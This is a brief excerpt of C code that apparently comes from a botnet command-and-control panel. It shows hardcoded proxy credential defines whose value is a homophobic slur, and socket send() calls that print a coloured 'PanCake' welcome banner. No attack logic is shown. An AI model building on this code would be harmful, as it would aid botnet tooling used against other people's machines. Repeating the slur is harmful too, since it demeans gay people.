...
#define MY_MGM_PROXYP "faggots"
#define MY_MGM_PROXYU "faggots"
...
fak:
        ...
        if(send(thefd, "*         \x1b[37mWELCOME TO THE PanCake\x1b[36m         *\r\n", 55, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "*          \x1b[37mMrScythe Is Bae <3\x1b[36m          *\r\n", 55, MSG_NOSIGNAL) == -1) goto end;
